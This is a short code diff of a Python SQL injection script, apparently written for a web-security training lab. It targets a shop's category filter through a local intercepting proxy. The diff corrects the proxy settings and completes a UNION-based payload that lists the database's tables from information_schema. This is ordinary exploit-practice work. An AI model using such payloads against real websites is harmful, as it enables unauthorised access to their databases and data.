@@ -5,7 +5,7 @@ import re
 from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def perform_request(url, sqli_payload):
     path = 'filter?category=Pets'
@@ -14,7 +14,7 @@ def perform_request(url, sqli_payload):
 
 def sqli_users_table(url):
     path = 'filter?category=Pets'
-    payload = ' UNION SELECT table_name, null FROM information_schema.tables'
+    payload = ' UNION SELECT table_name, null FROM information_schema.tables--'
     res = perform_request(url, payload)
     print(res)
 
